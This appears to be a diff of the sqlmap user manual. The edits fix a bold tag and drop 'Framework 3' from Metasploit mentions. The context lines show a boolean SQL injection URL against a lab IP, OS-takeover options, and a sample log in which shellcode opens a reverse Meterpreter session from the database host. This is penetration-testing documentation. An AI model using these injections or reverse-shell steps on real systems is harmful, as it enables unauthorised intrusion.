@@ -101,7 +101,7 @@ Assume that:
 
 <tscreen><tt>http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=1</tt></tscreen>
 
-is the same page as the original one and (the condition evaluates to <bf>True<bf>):
+is the same page as the original one and (the condition evaluates to <bf>True</bf>):
 
 <tscreen><tt>http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=2</tt></tscreen>
 
@@ -923,7 +923,7 @@ Options:
     --os-smbrelay       One click prompt for an OOB shell, meterpreter or VNC
     --os-bof            Stored procedure buffer overflow exploitation
     --priv-esc          Database process' user privilege escalation
-    --msf-path=MSFPATH  Local path where Metasploit Framework 3 is installed
+    --msf-path=MSFPATH  Local path where Metasploit Framework is installed
     --tmp-path=TMPPATH  Remote absolute path of temporary files directory
 
   Windows registry access:
@@ -2854,7 +2854,7 @@ operating system?
 [1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)
 [2] Stand-alone payload stager (file system way)
 > 
-[hh:mm:35] [INFO] creating Metasploit Framework 3 multi-stage shellcode 
+[hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode 
 which connection type do you want to use?
 [1] Reverse TCP: Connect back from the database host to this machine (default)
 [2] Reverse TCP: Try to connect back from the database host to this machine, on all ports 
@@ -2869,7 +2869,7 @@ which payload do you want to use?
 [3] VNC
 > 
 [hh:mm:40] [INFO] creation in progress ... done
-[hh:mm:43] [INFO] running Metasploit Framework 3 command line interface locally, please wait..
+[hh:mm:43] [INFO] running Metasploit Framework command line interface locally, please wait..
 
                                   _
                                  | |      o
@@ -2891,7 +2891,7 @@ LPORT => 60641
 LHOST => 192.168.136.1
 [*] Started reverse handler on 192.168.136.1:60641 
 [*] Starting the payload handler...
-[hh:mm:48] [INFO] running Metasploit Framework 3 shellcode remotely via UDF 'sys_bineval', 
+[hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF 'sys_bineval', 
 please wait..
 [*] Sending stage (749056 bytes) to 192.168.136.129
 [*] Meterpreter session 1 opened (192.168.136.1:60641 -> 192.168.136.129:1689) at Mon Apr 11 
